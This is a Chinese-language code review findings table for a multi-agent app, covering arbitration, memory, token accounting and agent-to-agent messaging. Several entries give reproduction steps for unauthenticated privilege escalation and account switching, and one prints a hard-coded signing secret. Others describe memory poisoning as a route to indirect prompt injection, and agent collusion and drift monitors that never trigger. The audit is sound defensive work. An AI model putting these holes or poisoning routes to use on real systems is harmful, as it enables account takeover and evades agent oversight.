| REV-085 | 服务 | 严重 | 安全 | **仲裁执法"缺省即最高权限"**：`tribunal.ts:386` `const actor = params.actorRole ?? TRIBUNAL_ROLE;`（不传即当作 `arbitrator` 过自家守卫），`arbitrationApi.ts:56` 该字段可缺省，`governanceAudit.ts:194` `actorId ?? 'governance:'+role`（身份为合成常量）。复现：`POST /api/arbitration/cases`（不带 actorRole）→ 200 + status=completed，并完成"裁决→停职→知识沉淀"全套执法、台账记 `allowed`。修复：入口强制绑定 `bindApprovalIdentity` 结果，缺省改 fail-closed。**比 REV-076 更严重：不提供身份即得最高权限** |
| REV-086 | 服务 | 严重 | 业务/交互 | **"3 仲裁者多数决"是硬编码假象**：`tribunal.ts:164-174` 循环 3 次 push 完全相同的 `{verdict:'new_wins', winnerId:plaintiff}` ⇒ `isUnanimous` 恒 true、`isDeadlocked = Object.keys(verdictCounts).length===3` 恒 false；仲裁者池 `assignArbitrators/executeVerdicts`（`arbitratorPool.ts:137/180`）零生产调用；`Regulation/finalArbiter.ts:53` 只接受 `deadlocked\|reasoning` 而 `reasoning` 仅函数内瞬时存在 ⇒ 监管终审恒 400、`deadlocked/timeout` 是只进不出的不可达态。修复：从池取 N≥`caseArbitratorCount` 经 `executeVerdicts` 产出，死锁按分布判定 | ✅复核（代码注释自陈"模拟 3 个仲裁者（规则一致）"） |
| REV-087 | 服务 | 高 | 安全 | **未鉴权立案可驱动扩容 → 铸造真实 L0 仲裁 Agent 并自抬角色上限**：`fileCase` 无守卫却调 `recordConflict+evaluateScaling`（`tribunal.ts:73-76`）→ `ensurePoolAgents`→`ensureDistinctAgentsForRole('arbitrator', desired)`（`arbitratorPool.ts:230→92`）→ `governanceProvisioning.ts:167-168` `limit = Math.max(limit, count); setRoleAgentLimit(...)` + `:174 allowGovernance: true`。复现：5 分钟内 ≥6 次 `POST /api/arbitration/cases`（换 conflictId）即 `scale_up` 注册最多 15 个 arbitrator。修复：上限只信配置、不可由需求抬升；立案加治理守卫 | △子代理 |
| REV-088 | 服务 | 高 | 业务/配置 | `Configs/arbitration.json` 大半键无消费方：`coreArbitrators/caseArbitratorCount/frequencyWindowSec/scaleDownFactor/deadlockTimeoutSec/snapshotStore`（+cpu/memory）零引用；`main.ts:333-335` 读的是不存在的 `arbitration.pool.*` 路径 ⇒ 恒回落硬编码 1/2；而 `configSchema.ts:166-177` 全部提供滑杆并承诺"死锁超时 → ARBITRATION_DEADLOCK"，该事件服务端从不发布；`dynamicScaling.ts:82` 窗口 300_000 写死 | △子代理 |
| REV-089 | 服务 | 高 | 交互/业务 | **停职与现场恢复均无落点**：`SUSPEND_AND_NOTIFY` 零订阅且 `SUSPEND` AgentEvent 全仓无生产者 ⇒ Agent 从不进入 `suspended`；`restorationManager.ts:71-81` `const failed = 0` 恒 0（`status:'failed'` 不可达）、只翻 `executed` 标志不做任何动作却判 `completed` 并广播 ACK；`tribunal.ts:411/419/423` 丢弃三步返回值（同 REV-079 家族） | △子代理 |
| REV-090 | 服务 | 高 | 业务/安全 | **取证空壳 + "LWW"名不副实（原告恒胜）+ 罚没零实现**：`initCapsuleAssembler` 零调用 ⇒ EvidenceSource 从未注入、`agentHistory` 恒空、metadata 恒 `{}`（`capsuleAssembler.ts:30/59-61`）；裁决不比时间戳而恒 `new_wins`（`tribunal.ts:168-169`），`arbitrationWiring.ts:100-112` 据此以 `arbitrator:tribunal` 身份废弃旧条目；`penalty` 字段与 `ARBITRATION_PENALTY`/`confiscate`（`walletManager.ts:215`）零实现 ⇒ 记忆投毒者只要先写冲突键即"赢"，旧事实被治理身份抹除 | △子代理 |
| REV-091 | 服务 | 中高 | 业务/安全 | **招募↔生命周期不闭合**：`expelAgent/expelAndReplace/validateTermination` 零生产调用（无工具/无 REST），但招募上限报错要用户"先开除"（不可执行的建议）；`recruiter.ts:124-141` 在状态转换**之前**先记台账，转换失败即 return ⇒ 台账留下"未执行的开除决定"（与 REV-082 反向）；`terminationRationale.ts:60` 按 agentId 覆盖无历史；招募写入的 allowedTools/tokenBudget/maxIterations/timeoutMs **无执行侧读取方**（`isToolAllowedForRole` 仅测试调用，`agentExecutor` 不 import agentRepository）⇒ 白名单/预算装饰化 | △子代理 |
| REV-092 | 服务 | 中 | 业务/日志 | 评审配置为死值且结论无下游：`reviewerAgent.ts:26-28,48-54` 的 `policy/maxReviewTimeMs/autoRejectOnTimeout` 从不被读（strict/moderate/lenient 三档与超时判定失效）；评审判定只 `consecutiveFailures++`，`APPROVAL_DECIDED` 零订阅，`isTaskApproved`/`getSubtask`/`listSubtasksByTask` 零调用（subtasks 台账只写不读）；`tribunal.ts:151/221/313` 三处守卫不传 meta ⇒ 台账无 caseId/traceId/targetIds；案件与裁决完全不落库（`snapshotStore:"sqlite"` 未消费），`getCase/getAllCases` 无属主校验 | △子代理 |
| REV-093 | 前端 | 严重 | 业务/谎报 | **Token 桑基图无数据时编造流量**：`TokenFlowSankey.tsx:68-70` 交易为空即按 `systemPool*10%` 造总量、`:81-84` 用 `?? totalFlow*0.6/0.2/0.15/0.05` 造消耗/税收/分润，图上显示具体数值且无"推算"标注 ⇒ 治理大屏输出根本不存在的经济数字（与 REV-066 的 usage 恒 0 叠加，真实交易确实常为空）。修复：无交易走 `hasData=false` 空态，估算必须打"推算"徽标 + 虚线 | △子代理 |
| REV-094 | 前端 | 高 | 交互/谎报 | **仲裁中心是伪造视图**：`ArbitrationView.tsx:25` `status: e.eventType.includes('filed') ? 'filed' : 'reasoning'`、每条事件当一条案件（`caseId: e.eventId`）⇒ "完成/死锁"徽标恒 0（`:41-43`）、七步进度条与九态标签对不上（`:5` vs `:8`）、conflictType='unknown'/被告空/裁决 null；而 `/api/loops/arbitration`、`arbitrationApi.ts:63` interventions、`regulationApi.ts:151` escalate 前端零调用 ⇒ 与 Dashboard"仲裁案件"数字互相矛盾，死锁不可见、无终审入口。修复：改读案件接口，用 `case.status` 原值渲染 | △子代理 |
| REV-095 | 前端 | 高 | 日志/体验 | **读失败一律伪装成"系统正常"**：五个 store 全为 `if (res.ok) …` 无 else（`systemStore.ts:48-51`、`agentStore.ts:31-32`、`tokenStore.ts:43-44`、`loopStore.ts:34-35`、`governanceStore.ts:112-115`），告警面板显示绿色"系统运行正常"（`AlertList.tsx:41-48`），`TokenLedger.tsx:87-91` 用 `?? 0` 显示"当前税率 0.0%"，`Dashboard.tsx:34-37` 的 LIVE 徽标与 `online/rateLimited/lastUpdated` 无关，且 `systemStore.rateLimited` 全项目无 UI 消费 ⇒ 用户把"读不到"当"没有"（叠 REV-014 限流即大屏长期显示 0 无人察觉） | △子代理 |
| REV-096 | 前端 | 高 | 体验/安全 | **审计域 UI 零覆盖但文案承诺留痕**：Client 全域无 `/api/audit/*` 调用（后端 `auditApi.ts:30-37` 提供 frozenAgents/latestPatrol/criticalAlerts），而 `GovernancePanel.tsx:81` 写"审计冻结、监管执法…都会在此留痕"，`configSchema.ts:188` 还允许调巡检失败率阈值 ⇒ 谁被冻结/为什么/怎么解除全无路径 | △子代理 |
| REV-097 | 前端 | 中高 | 交互 | 轮询与事件互写且无版本比较：仅 `systemStore` 5s 轮询（`useDashboardData.ts:19-25`），agents/tasks 只 hydrate 一次；`agentStore.ts:35-40` 对每个 `agent:*` 全量重拉 ⇒ 迟到的旧响应可覆盖新值、`AgentMonitor.tsx:14,23` 挂载快照却标"实时状态" | △子代理（同 REV-014 根因家族，新增面：无 serverTs/seq 单调性保护） |
| REV-098 | 前端 | 中 | 业务 | **Agent 状态色表与后端枚举不符**：`AgentTopologyGraph.tsx:16-23` 图例用 IDLE/WORKING/REVIEWING/BLOCKED/COMPLETED/FAILED（后端 `Core/AgentRuntime/types.ts:11-16` 实为 creating/ready/running/suspended/expelled/destroyed），`:119` 未知即回落灰 IDLE、`:161` `==='WORKING'` ⇒ "N 个工作中"恒 0 且与同屏"在线 Agent"自相矛盾；`AgentMonitor.tsx:5-8` 用正确枚举，两页对同一数据给不同结论；冻结/开除（suspended/expelled）无专属色 | △子代理 |
| REV-099 | 前端 | 中 | 业务/安全 | 治理留痕口径与回放细节：`governanceStore.ts:136` 与 `GovernancePanel.tsx:49` 用 `allowed = total - denied` ⇒ **outcome=failed 被计入"放行"**，且 `:142` 无"失败"筛选项；`GovernancePanel.tsx:162-168` + `:106` 清空后 `hydrated` 仍 true 且历史不可恢复；`TraceReplay.tsx:70`→`loopStore.ts:34` 选 trace 后 events 整体替换（左栏坍缩为 1 条、无法切回）、`:160` 失败即永挂"加载中"、`:252-254` payload 原文 JSON 直出（含工具参数/绝对路径，同 REV-034/047 面）；`:37-53` 缺 `approval.human_proxy` 标签致英文原样上屏 | △子代理 |
| REV-100 | 前端 | 中 | 可达性 | **治理页在打包态可能整体不可达**：`AppLayout.tsx:128-137` 有路由但全域无 `Link`/`navigate('/dashboard'|'/arbitration'|'/trace'|'/token-ledger'|'/agents')`，`FeatureList.tsx:30-55` 仅审批/Loop/账号；`AppRoot.tsx:17` 用 BrowserRouter + `file://`，`path="*"` 回落 WorkspaceLayout ⇒ 手输 URL 也进不去。需验证：打包后实测各路由入口（与 REV-109 的 Token 账本死链同源） | △子代理 |

### M05 三链接线核对（仲裁/评审/招募）
| 环节 | 实现 | 生产调用点 | 闭合 |
|---|---|---|---|
| 立案 | `fileCase` | `arbitrationWiring.ts:70`、`A2A/alertDisposition.ts:112`、`arbitrationApi.ts:46` | ⚠️ A2A 只立案，案件永停 filed |
| 取证/胶囊 | `capsuleAssembler` | `initCapsuleAssembler` 零调用 | ❌ EvidenceSource 未注入 |
| 裁决 | `reasonVerdict` | wiring/API | ❌ 硬编码假多数决（REV-086） |
| 停职执行 | `SUSPEND_AND_NOTIFY` | 无订阅者 | ❌ |
| 现场恢复 | `restorationManager` | wiring/API | ❌ 零动作即 completed |
| 死锁→终审 | `finalArbiter.issueFinalVerdict` | `regulationApi.ts:151` | ❌ 状态门永不可满足 |
| 知识沉淀 | `writeMemory` + 事件 | wiring/API | ⚠️ 吞错 |
| 评审判定 | `performReview→reviewSubmission` | `Tools/Custom/submitForReview.ts:95-106` | ⚠️ 已接但结论无消费者 |
| 招募 | `recruitAgent` | `Tools/Custom/agentRecruiter.ts:129`（`main.ts:537` 注端口） | ⚠️ 约束不生效（REV-091） |
| 开除/替换 | `expelAgent/expelAndReplace` | **无** | ❌ |

**孤岛补充**（零生产调用，与 REV-084 同族）：`assignArbitrators/executeVerdicts/releaseArbitrators`、`initCapsuleAssembler`、`addCompensatingAction`、`getPlan/getAllPlans`、`expelAgent/expelAndReplace/validateTermination/hasTerminationRecord/getTerminationRationale/getAllTerminations`、`isTaskApproved/getSubtask/listSubtasksByTask`、`isToolAllowedForRole`、`confiscate`；事件零订阅：`ARBITRATION_DEADLOCK/ARBITRATOR_POOL_RESIZED/RESTORATION_ACK/SUSPEND_AND_NOTIFY/AGENT_RECRUITED/AGENT_EXPELLED`；死配置：`ReviewConfig.policy/maxReviewTimeMs/autoRejectOnTimeout`、`ScalerConfig.scalingExponent`、`ArbitratorVerdict.penalty`。
**已核对干净**：`agentRecruiter` 工具侧角色白名单 + 治理三权拒募 + 预算/迭代区间校验扎实；`terminationRationale` 入参校验（证据非空、reason 合法、external_error 不计失败）正确；`performReview` 未注入 `callModelFn` 时 fail-closed 抛错不静默放行；`reviewSubmission` 校验 reviewer 角色、拒绝时不发 TASK_COMPLETED；`consolidateKnowledge` 失败如实返回 err 并 warn；治理写操作 UI 未提供"手填角色名"输入框（角色由 deciders 自动展开）；`GovernancePanel.tsx:31-46` 选择器返回稳定引用 + `recordId` 幂等去重；`WorkingModes` 三块治理 viz 顶部有「演示数据」徽标（`ModeShell.tsx:26-30`）未伪装真实数据。

---

## 9. M06 记忆 / Token 经济 / 上下文（REV-101~116）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-101 | 服务 | 严重 | 安全 | **属主切换端点即身份切换**：`memoryApi.ts:224-225` `setActiveOwner(body.userId ?? null)` + `hydrateLongTermMemory()` 无身份校验，`main.ts:849` host 缺省 `0.0.0.0`，router 无鉴权中间件（对照 `a2aApi.ts:38-59` 是 fail-closed）⇒ 一条 HTTP 把整个进程数据视野切到他人 userId，此后记忆/Agent 循环/A2A 读写全落在该账号。修复：切换只接受受信通道（IPC + 登录态），REST 加鉴权并把 userId 与已认证主体绑定。与 REV-001 同口径但此处是**数据视野切换**（新影响面） | △子代理 |
| REV-102 | 服务 | 严重 | 安全 | **写路径版本基线未按属主过滤 → 跨账号内容外泄**：`globalWorkspace.ts:112` `getLatestByKey(params.key)`（`:254-265` 走 keyIndex 全量、无 ownedBy），而 `:128-129` 把 `newContent` + `existingContent` **同时**塞进 `CONFLICT_DETECTED`（进日志/仲裁/L3 prompt）；读侧 `:213` 有 ownedBy、写侧没有 ⇒ 跨属主同 key 互相 supersede，他人记忆原文经事件与仲裁泄漏。修复：`getLatestByKey(key, owner)`，事件只带 entryId + 摘要 | △子代理 |
| REV-103 | 服务 | 严重 | 业务 | **乐观锁恒不触发且冲突被当成功返回**：`globalWorkspace.ts:114` `expectedVersion = params.expectedVersion ?? currentVersion` → `:171 interceptWrite(entry, currentVersion, expectedVersion)` 恒等 ⇒ `writeGuard.ts:44` 冲突分支 0 生产可达；`:61 return ok({success:false, conflict})` → `:173-174 return ok(guardResult.value)`，调用方只看 `.ok`（`loopKnowledge.ts:57`、`arbitrationWiring.ts:113`），`MEMORY_VERSION_CONFLICT` 无订阅者 ⇒ 多 Agent 并发写同 key **静默丢更新并 INFO 记为成功**（记忆丢失最难查）。修复：缺省即强制读版本比对，冲突返回 err | △子代理 |
| REV-104 | 服务 | 高 | 安全 | **模型输出以 `observed` 无条件入长期记忆，无长度/清洗（记忆投毒→间接提示注入）**：`loopKnowledge.ts:49-53` 把 `outputText`（仅截 500 字）写为 `assertion:'observed'`；`memoryConsolidator.ts:29` 按 observed 捞取；`longTermMemory.ts:81 assertion = params.assertion ?? 'observed'` 默认放行；`broadcastChannel.ts:87`、`arbitrationWiring.ts:108` 同样硬编码；`memoryApi.ts:191-204` bulk 允许**请求体自带 assertion/category**（≤5000 条）⇒ §8.4 分级失效，未认证批量灌入即可经 `vector.search` 召回注入新会话。修复：区分 model_output 与 observed；沉淀白名单 contentType；bulk 的 assertion 由服务端判定 + 限流 | △子代理 |
| REV-105 | 服务 | 高 | 业务/计量 | **只有事后扣费、扣费失败即丢记录，税/销毁口径恒 0**：无人使用 `walletManager.ts:86 checkBalance`、`dualBudget.ts:100/112`（无前置闸门，扣穿仍继续调用）；`consumptionRecorder.ts:88 if (!debitResult.ok) return err(...)` ⇒ 余额耗尽那一轮**零 ConsumptionRecord**；`loopEconomy.ts:89` 失败仅 `logger.debug` 而 `default.json` logLevel=info ⇒ 生产不可见；`totalTaxCollected/Destroyed` 只在 `taxCollector.ts:99-100`（distributeTax，零生产调用）累加 ⇒ `tokenApi.ts:25-26` 恒报 0；`walletManager.ts:220 confiscate` 只减 balance 不入池/销毁，`:261 verifyConservation` 必误报。修复：调用前预算+余额闸门；debit 失败仍记账并 warn；接通或删除税收口径 | △子代理 |
| REV-106 | 服务 | 中高 | 一致性 | **仲裁 discard 只改内存，重启后旧记忆复活**：`globalWorkspace.ts:244-250` 置 `status='discarded'` 后直接 `return ok(undefined)` 不 persistEntry，`:178-182` 的 superseded 同样未回写（`:187` 只写新条目），而 `:218-222` 无条件合并 `loadPersistedEntries(owner)`（DB 行仍 active）。复现：语义冲突→仲裁 new_wins→重启→旧条目重新出现在记忆列表与仲裁面板 | △子代理 |
| REV-107 | 服务 | 中 | 缓存/业务 | **缓存命中短路执行与 Hook，SAFE+YES 状态型工具永不失效**：`toolDispatcher.ts:76-97` 命中即 return，跳过 `:110/:122` Pre/PostToolExecute；失效仅在 `:147 dangerLevel !== 'SAFE'`；`todoWriter.ts:55-58`、`vectorSearch.ts:31-33` 均 SAFE/YES ⇒ todo.write 同参成功后清空再同参调用返回"成功"但计划未写回；写入新记忆后同 query 检索返回旧结果。修复：命中仍发轻量 Hook；依赖全局状态者不缓存或在写点 invalidate（`clearTodos` 现无钩子）。与 REV-043 同族（那是键缺作用域，这是缺失效面） | △子代理 |
| REV-108 | 服务 | 中 | 业务/体验 | **三套 token 估算互异 + 每轮新建 ContextStore + 记忆工具不在热名单**：`contextCompression.ts:107` 用 `content.length/4`（CJK 低估）vs assembler 的 CJK 感知估算 vs 真实 usage ⇒ 中文会话压缩滞后→上游截断/400；`ipcBridge.ts:950` 固定 `listMessages(sessionId, 50)`、`:1033 new ContextStore()` 每次生成新建 ⇒ 会话工作集跨轮丢失；`Configs/tools.json` hot 名单无 `vector.search`、`vectorSearch.ts:59 minScore:0.05` 硬编码 ⇒ "记住这件事"默认跨会话不复现。修复：统一估算器、ContextStore 按 sessionId 复用、被动召回注入（带预算与围栏） | △子代理 |
| REV-109 | 前端 | 严重 | 业务/交互 | **设置页"热更新"全链路是前端自嗨**：`configStore.ts:213 applyEffective` 注释自陈"保留为扩展点（未来可通知后端刷新参数等）"，flush 只回写 localStorage overrides；`configApi.ts:56,60` 只有 `GET /api/configs`、`GET /api/configs/:name`，**无 PUT/POST，IPC 亦无 set-config** ⇒ 所有滑杆（税率、记忆胶囊预算等）改完界面显示"N 项待生效"，后端参数纹丝不动、重启后文件仍是旧值。修复：补 `PUT /api/configs/:name` 或 reload 通道并在 flush 回传结果、失败告警 | △子代理 |
| REV-110 | 前端 | 高 | 业务/配置 | `Configs/memory.json` 9 键（conflictSimilarityThreshold/capsuleMemoryTopK/privateStateTtlSec/supersedeGraceSec/vectorDim 等）在 `Src/**` 零引用，而 `configSchema.ts:197-209` 暴露 10 个可调滑杆；`main.ts:837` 还硬编码 `initEventBus({maxQueueSize:10000})` ⇒ 全部为装饰。修复：接线或删滑杆并标注"只读/需重启" | △子代理 |
| REV-111 | 前端 | 高 | 可达性 | **Token 账本页没有任何入口**：`AppLayout.tsx:136` 只有 `<Route path="/token-ledger">`，`FeatureList.tsx:30-55` 无该项、全域无 `navigate('/token-ledger')`，打包态 `AppRoot.tsx:17` BrowserRouter + `file://` 时 `path="*"` 回落 WorkspaceLayout（`:143`）；而 `OnboardingWizard.tsx:541` 承诺"账本在「Token 账本」页可查" ⇒ 死链，余额/税/分润整域不可达（同 REV-100） | △子代理 |
| REV-112 | 前端 | 高 | 体验/业务 | **记忆页只读 KV 投影，真正的"记住的事"看不了也删不掉**：`FeatureView.tsx:193,198` 只取 `/api/memory/entries`（`key=ltm-<n>`、value 为整条 JSON），`:234` `JSON.stringify(entry.value).slice(0,100)` 再叠 truncate，无展开、不显示 title/namespace/updatedAt/来源；`:236` `total: entries.length` 且 `:35` 默认 limit=50 不提示截断；后端 `memoryApi.ts:132-143` 的 query/category/status 检索全未接入；**memoryApi 无 DELETE、全仓无删除入口** ⇒ 增删改查只剩"查半截" | △子代理 |
| REV-113 | 前端 | 高 | 日志 | **读取失败被伪装成"空"（记忆/技能两处）**：`ipcBridge.ts:704,764,772` `catch { return { ok:true, data:{ items: [], total: 0 } } }`、`memoryApi.ts:64` `catch { return []; }` ⇒ `FeatureView.tsx:238` 渲染"暂无记忆条目/暂无技能"。信封恒 ok，前端无从属信号（同 REV-012 但登记其**用户可见后果**）。修复：回 `ok:false` 并三态区分 | ✅复核（ipcBridge:703-705 已见） |
| REV-114 | 前端 | 中 | 体验 | 流水不随流式消耗刷新且失败静默显示 0：`useEventBus.ts:64-66,77` 的 `token:*` 只 `hydrate()`（overview），`hydrateTransactions` 仅 `TokenLedger.tsx:45` 挂载时一次；`tokenStore.ts:44` 丢弃错误 ⇒ 页面开着数字不动、接口挂了看起来像"系统池 0"（同 REV-095） | △子代理 |
| REV-115 | 前端+服务 | 中 | 业务 | **Token 流水只存进程内存，重启即归零**：`walletManager.ts:17 const transactions: TokenTransaction[] = []`，`:248-251` 直接返回该数组，全仓无 `INSERT INTO token_transactions` 写入方；而 `configSchema.ts:243` 标注 `retention.tokenTransactionsPermanent` = "审计法定留存" ⇒ 口径冲突且 UI 未声明"仅本次运行" | △子代理 |
| REV-116 | 前端 | 中 | 安全/日志 | 破坏性恢复绑在 `confirm` 的"确定"上 + 上行失败当成功：`AccountPanel.tsx:312` `globalThis.confirm('…【确定】= replace（清空云端该账号数据后重建）…')` 回车即清空（无输入确认）；`syncService.ts:241 return res.ok ? (res.data.items ?? []) : []` ⇒ 读失败被当"无记忆"，`:341` 显示"记忆 0 新增/0 更新"并标记成功 | △子代理 |

### Token 计量覆盖表（唯一生产计量点 = `runIteration.ts:660 → loopEconomy.recordIterationEconomy`，且 `:40 if (totalTokens<=0) return`）
| 调用点 | 计入预算/钱包 | 证据 |
|---|---|---|
| 主循环非流式 | ✅ | `runIteration.ts:660` |
| 主循环流式 | ❌ usage 恒 0 | 同 REV-066 |
| 上下文压缩摘要 | ❌ 直调 `callModel` | `contextCompression.ts:78/211` |
| L3 裁判 | ❌ | `main.ts:731-735` |
| embedding（`memoryEmbeddings`） | ❌ | `embedText/embedPendingEntries` |
| 会话命名 / SLM 直连 | ❌ 绕过 callModel 无 usage | `sessionNamer`、`slmCaller` |
| provider 探针 / 评审 / judge | ❌ 未接经济层 | REV-092/093 |

**已核对干净**：`buildContextHistory` 对空白 assistant/悬空 user 的过滤正确；`todoStore.replaceTodos` 事务化；file.write/edit 为 CONTROLLED → 触发 blanket clear（文件陈旧已覆盖）；memoryApi 读侧 owner 过滤 + bulk 400/413 上限；`ipcBridge.ts:980-1007` 缺 Key 前置 fail-fast 与可读报错；`api.ts:159-183` 429+Retry-After；记忆值走 JSX 文本渲染无 XSS；`prefsStore.adoptAccount` 跨账号水位隔离自洽。
**孤岛补充（Context/Memory 侧）**：Context assembler/partitions/scoring/truncation/appendWriter；`tokenLedger.appendTransaction`（无人调，`:49-65` 双重计销毁）；`profitDistributor.executeDistribution`（无回滚）；`taxCollector.calculateTax/distributeTax`；`dualBudget.checkSingleCallLimit/checkTraceBudget`；`longTermMemory.getMemory/searchMemory/deprecateMemory/contradictMemory`（`SELF_REINFORCING` 反而在每次 `getMemory` 发布）；`memoryGuard` RM7（`sourceMessageId` 从不传 ⇒ `:56` 死分支）；`contextStore.messageFingerprint`。

---

## 10. M07 A2A 与事件系统（REV-117~131）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-117 | 服务 | 严重 | 交互/业务 | **A2A"唯一通信通道"的写面零接线**：`a2aBroker.ts:186/422/442`、`handoff.ts:175/243/253` 只被自身与 Tests 引用，`grep sendA2A\|escalateToGovernance\|sendHandoff Src/` 仅命中定义行 ⇒ 八步校验链、配额、越级、反串通、治理队列、R1/R2 交接对账对真实 Agent 流量完全不生效；`governanceQueue.ts:38` inbox 过滤 `kind==='escalate'` 而 escalate 只由未接线函数产生 ⇒ 治理 inbox 恒空、`/api/a2a/inbox/drain`、`/ack` 操作空表（叠 REV-058 的 preload 层级错配，A2A 同步链路双向死）。修复：运行时 Agent 出口改经 `sendA2A`；drain 由定时器/事件驱动 | △子代理 |
| REV-118 | 服务 | 高 | 交互 | **InputDeduplication 整模块零接线**：`dedupMiddleware.ts:183 dedupCheck` 等全仓仅命中本文件，真正使用的是另一实现 `Services/LoopScheduler/dedupStore.ts`（两套去重并存）；且 `dedupCheck:196-213` 先 `checkDedup`（`:82` 立即写键）再判冷却/并发 ⇒ 被拒请求仍占去重键、误杀合法重试；`acquireConcurrencySlot:128` 无配对 `releaseConcurrencySlot:143` 调用 ⇒ 计数单调爬满后拒绝一切。修复：删除或明确接线并调整顺序、slot 用 finally 释放 | △子代理 |
| REV-119 | 服务 | 中高 | 日志/内存 | `processedEventIds` 无界增长：`eventBus.ts:24,50-51` 每次 publish `add(eventId)`，`eventLog` 有 `maxQueueSize` shift 但 Set 永不清理（仅测试的 `resetEventBus`）；`ipcBridge.ts:1051` 每个流式 token 都 publish ⇒ 长会话主进程内存持续膨胀，而 `createEvent` 每次生成唯一 id ⇒ 去重几乎不触发、纯开销。修复：环形上限或随 eventLog 淘汰回收（与 REV-020 同一处，此处补充"去重永不生效"结论） | △子代理 |
| REV-120 | 服务 | 中 | 交互/体验 | **投递语义缺环：无重试 / 无死信 / ACK 无看门狗**：`a2aStore.ts:181 markAcked` 仅被 `a2aApi.ts:172` 调用，全仓无 ack 截止扫描；`a2aBroker.ts:377-395` 的步骤⑧"投递"实为 `finalize` 落库+发事件（至多一次的"记录"，目标侧靠轮询 REST）⇒ 卡住的 A2A 无超时与升级，用户看不到"谁给谁发了什么/是否回执"。修复：投递队列 + ACK 超时重投 + 死信落库 + IPC 下行 | △子代理 |
| REV-121 | 服务 | 中 | 业务/安全 | **C2 任务漂移恒不触发**：`a2aBroker.ts:265` 调 `detectTaskDrift` 从不传 `consecutiveHits` ⇒ `collusion.ts:130-131 hits=(input.consecutiveHits ?? 0)+1` 恒为 1 < `driftConsecutive(3)` 即 null；连续命中从未跨消息累计/持久化 ⇒ "私下协商/离题漂移"检测完全失效（且该路径本身未接线）。修复：从 `a2a_messages` 计算该对最近连续漂移条数，或改单条即告警 | △子代理 |
| REV-122 | 服务 | 中 | 业务 | **小时配额按"有向对"计数可扇出绕过**：`a2aBroker.ts:231-233 countMessages(source,target,QUOTA_WINDOW_MS)` 逐对判 `maxMessagesPerHour`；`a2aStore.ts:202 countMessages` 无 `verdict` 过滤 ⇒ 被 block/quarantine 的消息反向消耗配额并放大 C1 互惠计数，而向多个 target 扇出可绕开每 Agent 上限。修复：按 source 聚合判 Agent 预算、计数加 `verdict='allow'` 口径 | △子代理 |
| REV-123 | 服务 | 低中 | 安全 | **接收侧从不验签 + 密钥硬编码回退**：`verifySignature` 仅测试调用，`a2aApi.ts:110/187` 返回 `envelope.payload` 未校验签名/hash；`a2aBroker.ts:41 process.env['CIVITAS_A2A_SECRET'] ?? 'civitas-a2a-local-broker-secret'`；`applyPulledMessages`（`a2aStore.ts:466`）对 `chain_scope='cross_device'`、`signature=''` 的拉回项无验签即可入本机事实 ⇒ 跨设备/多进程场景可伪造或篡改 payload。修复：cross_device 行落库前做 hash 集合校验；缺 `CIVITAS_A2A_SECRET` 即拒绝签发 | △子代理 |
| REV-124 | 前端 | 高 | 交互/业务 | `agent:`/`task:` 前缀误伤逐 token 事件 → 每 chunk 一次 HTTP：`useEventBus.ts:73` 无条件 `applyEvent` → `agentStore.ts:37 if (type.startsWith('agent:')) hydrate()`（`taskStore.ts:52` 对 `task:progress` 同构）；FE-012 节流只覆盖 `loop:/token:`（`:196`）⇒ 秒级数百请求、429、Agent 列表反复整表重排、hydrate 竞态后写覆盖先写。修复：按类型白名单驱动 hydrate + 统一尾随节流与在途合流（与 REV-014 同处，此处补充 `taskStore` 同构面与竞态覆盖） | △子代理 |
| REV-125 | 前端 | 高 | 交互/业务 | **停止生成被双写覆写，终态语义丢失**：`ChatView.tsx:73 stopStream` 置 stopped → 后端 `ipcBridge.ts:900-907` 发 `reason:'user_stopped'`，但 `useEventBus.ts:85-103` **从不读 `reason`**；abort 后 `executeLoop` 常正常返回，成功分支再发一条 stream_end（`:1176-1192`）⇒ `chatStore.ts:776` 改 complete、`:819` 改 error，且 `persistMessageRich` 二次落库。修复：`reason==='user_stopped'` 映射 stopped + 三个终态函数加 `status!=='streaming'` 幂等守卫（同 REV-009/031 家族，此处是"前端不读 reason + 双帧"合成后果） | △子代理 |
| REV-126 | 前端 | 高 | 交互 | **下行信封丢 eventId/seq，回放与实时共用一个缓冲**：`ipcBridge.ts:264-268 msg={type,data,timestamp}`，而后端 `DomainEvent` 有 `eventId`、`aiEventStore.ts:99` 落库存 `event_id`+`seq` ⇒ `AgentView.tsx:116-121` 历史用 `event.id`、实时退化成 `type-timestamp-index`（`AIEventBus.tsx:68` 同样用 index，三处去重口径各异）；`chatStore.ts:342-347` 回放前 `clearEvents()` 把在途实时事件抹掉 ⇒ 同一条事件在时间线出现两次、缺口与重复不可判、切会话/重启后重复渲染工具卡与轮次（与 REV-022 不同根因）。修复：信封补 `eventId/seq`、按 eventId 去重、回放写独立 `replayed` 命名空间 | △子代理 |
| REV-127 | 前端 | 中高 | 体验/业务 | **A2A 事件与同步三态在用户侧零呈现**：`shared/eventTypes.ts:56-65` 声明 10 个 `a2a:*` 事件，但 `ai-components/registry.ts:120-124 inferFamilyFromEventType` 无 `a2a` 分支、`multiagent/index.ts:7-9 registerAll` 空实现、后端 `/api/a2a/inbox\|cards\|alerts\|reveal` 前端零引用；`accountStore.ts:601,627 try { await syncA2A(); } catch {}` 丢弃结果 ⇒ 上行/拉回失败与脱敏条数完全不可见；`a2aSync.ts:194-214 pullA2A` 游标只在局部变量（调用方不传 `since`）⇒ 每轮从第 1 页重扫、最多 20×200 条重复拉取。修复：补 a2a 族注册与收件箱/告警视图；结果并入 `lastError/warnings`；游标持久化 | △子代理 |
| REV-128 | 前端 | 中高 | 体验/安全 | **在线态是能力探测的产物，断连永不可见**：`eventBusBridge.ts:44-57` 只要 `electronAPI.onBackendEvent` 存在就 `setOnline(true)`，`OfflineBanner.tsx:10 if (online) return null`；`disconnectBridge` 与 `preload.ts:135-137 removeBackendEventListeners` 全仓无调用点 ⇒ `onBackendEvent` 只 on 不 remove，disconnect→reconnect 会双监听、每条事件双投（正文翻倍）；主进程 `ipcBridge.ts:252-258`（ipcMain 不可用即空操作）与 `:108-115`（广播失败只 warn 一次）渲染端无从得知；后端已有 `ping/pong`（`:920-922`）未被使用。修复：connect 后 ping 探测 + 超时降级；监听器返回 disposer | △子代理 |
